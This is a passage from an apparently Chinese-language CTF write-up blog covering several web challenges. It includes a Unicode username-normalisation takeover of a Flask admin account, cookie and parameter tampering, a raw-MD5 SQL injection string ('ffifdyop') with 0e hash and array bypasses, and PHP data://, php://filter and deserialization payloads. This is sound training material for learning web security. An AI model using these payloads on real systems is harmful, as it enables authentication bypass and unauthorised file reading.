alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\7da4733b529b481d8c929b80478ac107.png\"/>猜测是xss，结果一顿操作后啥也不是</p>\n<p>下一个选项change password<br/> 发现change源码中有一个地址</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\9e460a26e0874faba4c49fb4cbe02e30.png\"/><br/> 访问一下发现提供了网页的源码,是一个flask项目<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\befb08fd57724f33aa644e12bdbe3ef8.png\"/>既然是flask项目，那就先查看一下路由<br/> 在APP目录里找到<code>routes.py</code>路由文件</p>\n<pre><code class=\"prism language-python\"><span class=\"token comment\">#!/usr/bin/env python</span>\n<span class=\"token comment\"># -*- coding:utf-8 -*-</span>\n\n<span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> render_template<span class=\"token punctuation\">,</span> url_for<span class=\"token punctuation\">,</span> flash<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> redirect<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">,</span> make_response\n<span class=\"token keyword\">from</span> flask_login <span class=\"token keyword\">import</span> logout_user<span class=\"token punctuation\">,</span> LoginManager<span class=\"token punctuation\">,</span> current_user<span class=\"token punctuation\">,</span> login_user\n<span class=\"token keyword\">from</span> app <span class=\"token keyword\">import</span> app<span class=\"token punctuation\">,</span> db\n<span class=\"token keyword\">from</span> config <span class=\"token keyword\">import</span> Config\n<span class=\"token keyword\">from</span> app<span class=\"token punctuation\">.</span>models <span class=\"token keyword\">import</span> User\n<span class=\"token keyword\">from</span> forms <span class=\"token keyword\">import</span> RegisterForm<span class=\"token punctuation\">,</span> LoginForm<span class=\"token punctuation\">,</span> NewpasswordForm\n<span class=\"token keyword\">from</span> twisted<span class=\"token punctuation\">.</span>words<span class=\"token punctuation\">.</span>protocols<span class=\"token punctuation\">.</span>jabber<span class=\"token punctuation\">.</span>xmpp_stringprep <span class=\"token keyword\">import</span> nodeprep\n<span class=\"token keyword\">from</span> io <span class=\"token keyword\">import</span> BytesIO\n<span class=\"token keyword\">from</span> code <span class=\"token keyword\">import</span> get_verify_code\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/code'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_code</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    image<span class=\"token punctuation\">,</span> code <span class=\"token operator\">=</span> get_verify_code<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># 图片以二进制形式写入</span>\n    buf <span class=\"token operator\">=</span> BytesIO<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    image<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token string\">'jpeg'</span><span class=\"token punctuation\">)</span>\n    buf_str <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">.</span>getvalue<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># 把buf_str作为response返回前端，并设置首部字段</span>\n    response <span class=\"token operator\">=</span> make_response<span class=\"token punctuation\">(</span>buf_str<span class=\"token punctuation\">)</span>\n    response<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'Content-Type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'image/gif'</span>\n    <span class=\"token comment\"># 将验证码字符串储存在session中</span>\n    session<span class=\"token punctuation\">[</span><span class=\"token string\">'image'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> code\n    <span class=\"token keyword\">return</span> response\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span>\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/index'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'index.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'hctf'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/register'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">register</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    <span class=\"token keyword\">if</span> current_user<span class=\"token punctuation\">.</span>is_authenticated<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    form <span class=\"token operator\">=</span> RegisterForm<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        name <span class=\"token operator\">=</span> strlower<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'image'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> form<span class=\"token punctuation\">.</span>verify_code<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">'Wrong verify code.'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'register.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'register'</span><span class=\"token punctuation\">,</span> form<span class=\"token operator\">=</span>form<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> User<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>filter_by<span class=\"token punctuation\">(</span>username <span class=\"token operator\">=</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">'The username has been registered'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'register'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        user <span class=\"token operator\">=</span> User<span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span>\n        user<span class=\"token punctuation\">.</span>set_password<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span>\n        db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>commit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        flash<span class=\"token punctuation\">(</span><span class=\"token string\">'register successful'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'register.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'register'</span><span class=\"token punctuation\">,</span> form <span class=\"token operator\">=</span> form<span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/login'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> current_user<span class=\"token punctuation\">.</span>is_authenticated<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    form <span class=\"token operator\">=</span> LoginForm<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        name <span class=\"token operator\">=</span> strlower<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        session<span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> name\n        user <span class=\"token operator\">=</span> User<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>filter_by<span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> user <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">not</span> user<span class=\"token punctuation\">.</span>check_password<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">'Invalid username or password'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        login_user<span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">,</span> remember<span class=\"token operator\">=</span>form<span class=\"token punctuation\">.</span>remember_me<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'login.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'login'</span><span class=\"token punctuation\">,</span> form <span class=\"token operator\">=</span> form<span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/logout'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">logout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    logout_user<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span><span class=\"token string\">'/index'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/change'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> current_user<span class=\"token punctuation\">.</span>is_authenticated<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    form <span class=\"token operator\">=</span> NewpasswordForm<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        name <span class=\"token operator\">=</span> strlower<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        user <span class=\"token operator\">=</span> User<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>filter_by<span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        user<span class=\"token punctuation\">.</span>set_password<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>newpassword<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>commit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        flash<span class=\"token punctuation\">(</span><span class=\"token string\">'change successful'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'change.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'change'</span><span class=\"token punctuation\">,</span> form <span class=\"token operator\">=</span> form<span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/edit'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        \n        flash<span class=\"token punctuation\">(</span><span class=\"token string\">'post successful'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'edit.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'edit'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>errorhandler</span><span class=\"token punctuation\">(</span><span class=\"token number\">404</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">page_not_found</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    title <span class=\"token operator\">=</span> <span class=\"token builtin\">unicode</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span>\n    message <span class=\"token operator\">=</span> error<span class=\"token punctuation\">.</span>description\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'errors.html'</span><span class=\"token punctuation\">,</span> title<span class=\"token operator\">=</span>title<span class=\"token punctuation\">,</span> message<span class=\"token operator\">=</span>message<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">strlower</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    username <span class=\"token operator\">=</span> nodeprep<span class=\"token punctuation\">.</span>prepare<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> username\n</code></pre>\n<p>然后我就没什么思路了，下面看一下大佬们的解题方法</p>\n<ul><li><strong>代码审计</strong>：这里重点要注意以下<code>strlower()</code>函数，其中调用<code>nodeprep.prepare</code>函数，在代码开头有一行代码：<code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code>，说明<code>nodeprep</code>是从<code>twisted模块</code>中导入的，利用<code>nodeprep.prepare</code>函数会将unicode字符<code>ᴬ</code>转换成<code>A</code>，而<code>A</code>在调用一次<code>nodeprep.prepare</code>函数会把<code>A</code>转换成<code>a</code>。而值得注意的是<code>strlower()</code>自定义函数被调用了三次，分别是<code>register</code>、<code>login</code>、<code>change</code>，即注册、登陆、修改密码时都会被调用。</li><li><strong>思路</strong>：用<code>ᴬdmin</code>注册，后台代码就会调用一次<code>nodeprep.prepare</code>函数，把用户名转换成<code>Admin</code>；修改一次密码，再次调用<code>nodeprep.prepare</code>函数，使用户名由<code>Admin</code>转换为<code>admin</code>，重新登陆，就可以得到flag</li></ul>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\d1461ea8cf2a475092da1bc493e00c67.png\"/><br/> 登陆<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\960f6dec9244445a9831c0de5d47ceaa.png\"/><br/> 进入之后自动将<code>ᴬdmin</code>转换为<code>Admin</code><br/> 然后修改密码重新登陆<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\cdb61e31a88b48dc9ba0594f7bb54e02.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\df2c51a43f31425fbe01366557ecd8a1.png\"/>拿到flag~~</p>\n<h1><a id=\"_2019BuyFlag_964\"></a>[极客大挑战 2019]BuyFlag</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\89cd5d764cac40f2a9041f5e9b02da38.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\c2d17874bd884729a2e97d30b3d19436.png\"/><br/> 查看源码<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\58b8352df4ef4edeb3cdc0c4af51a10d.png\"/><br/> 代码审计：以post方式传参，money=100000000，password满足等于404，但是不能为数字，所以password等于404+任意字符<br/> 使用burpsuite抓包</p>\n<p>总结一下需要满足四个条件：<code>前面提示必须是cuit的学生</code>；<code>以post方式传参</code>；<code>money=100000000</code>；<code>password=404a</code>。</p>\n<p>所以修改cookie里的<code>user=0</code>为<code>user=1</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\98a9aa539adb4e43a11b0669cd663541.png\"/></p>\n<p><code>password=404a&amp;money=100000000</code>，<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\92dda9d526ac4114bc86de0447f3bc8f.png\"/>这里提示数字太长<br/> <code>password=404a&amp;money=1e9</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\3abefc60c90a43298945751deb015bff.png\"/></p>\n<h1><a id=\"BJDCTF2020Easy_MD5_988\"></a>[BJDCTF2020]Easy MD5</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\3e0ef1a33b264cc595d21b54ed75513b.png\"/><br/> 查看源代码没有什么发现，抓包看一看</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\33e5890b700549a7b786ddc921976b08.png\"/>线索暗示：<code>Hint: select * from 'admin' where password=md5($pass,true)</code></p>\n<p><strong>md5(string,raw)</strong></p>\n<table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要计算的字符串。</td></tr><tr><td>raw</td><td>可选。规定十六进制或二进制输出格式： TRUE - 原始 16 字符二进制格式；FALSE - 默认。32 字符十六进制数</td></tr></tbody></table>\n<p>现在需要构造or来绕过password，<code>md5(ffifdyop,true)='or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c</code><br/> 原sql查询语句则变为<code>select * from user where username ='admin' and password =''or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c'</code>即可绕过<br/> 类似的字符串还有:<code>md5(129581926211651571912466741651878684928,true)=\\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1'or'8</code><br/> 在输入ffifdyop后，出现</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\5ba842dd7f434727a2fdd3edf9a957d4.png\"/></p>\n<p>查看源码<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\876c307af33d4554bf78653e837b2687.png\"/><br/> 这里就需要知道一个知识点：md5加密后的值开头为0E是他们的值相等<br/> <code>/levels91.php?a=s878926199a&amp;b=s155964671a</code><br/> 出现以下提示<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\5fd9a6ca98de47e6a32de1c28d12c992.png\"/><br/> 我们访问levell14.php<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\9c21cd0b066740988514d2943fc74dbb.png\"/>这里用php数组绕过，由于哈希函数无法处理php数组，在遇到数组时返回false，我们就可以利用false==false成立使条件成立。<br/> <code>param1[]=1&amp;param2[]=2</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ca0ca09136aa491395a8e358dc9b3a4b.png\"/></p>\n<h1><a id=\"ZJCTF_2019NiZhuanSiWei_1018\"></a>[ZJCTF 2019]NiZhuanSiWei</h1>\n<p><strong>题目类型：<a href=\"https://blog.csdn.net/m0_52923241/article/details/115528880?spm=1001.2014.3001.5501\">反序列化</a>+<a href=\"https://blog.csdn.net/m0_52923241/article/details/117913577\">PHP伪协议</a></strong><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a639350985d04b328a1fc7628dc63ff4.png\"/>这里注释提示有一个useless.php文件，访问一下<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\bc32b2d1558e457098113721651bdf2f.png\"/><br/> 发现什么都没有</p>\n<p><strong>代码审计</strong>：有这样一行代码<code>isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\"</code>，我们需要传入一个内容为<code>welcome to the zjctf</code>的文件。这时就要用到data协议，data协议通常是用来执行PHP代码，也可以将内容写入data协议中，然后让file_get_contents函数取读取。构造：<code>data://text/plain,welcome to the zjctf</code>，为了绕过某些过滤，这里用到base64编码。<strong>构造payload</strong>：<code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>。然后有一个可控参数file，构造<code>file=useless.php</code>，但是针对php文件我们需要进行base64编码，否则读取不到其内容，所以构造payload：<code>file=php://filter/read=convert.base64-encode/resource=useless.php</code>。<br/> 得到以下经过base64加密的字符，<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ccf5fc4e71cb49289583a7dc58f24d20.png\"/><br/> 接下来进行base64解密，得到useless.php内容</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>  \n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">{<!-- --></span>  <span class=\"token comment\">//flag.php  </span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__tostring</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>  \n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>  \n            <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"U R SO CLOSE !///COME ON PLZ\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>  \n    <span class=\"token punctuation\">}</span>  \n<span class=\"token punctuation\">}</span>  \n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>  \n\n</code></pre>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>  \n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__tostring</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>  \n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>  \n            <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"U R SO CLOSE !///COME ON PLZ\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>  \n    <span class=\"token punctuation\">}</span>  \n<span class=\"token punctuation\">}</span> \n<span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span> \n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>  \n\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\efd314d6aa954a51a7d032e3e22562b3.png\"/><br/> 故最后payload为<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\f17d4c06cbde44489f57594b5eb43841.png\"/>查看源码<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\39661c3755464b8c954ebe9f679c35fb.png\"/></p>\n<h1><a id=\"SUCTF_2019CheckIn_1069\"></a>[SUCTF 2019]CheckIn</h1>\n<p><a 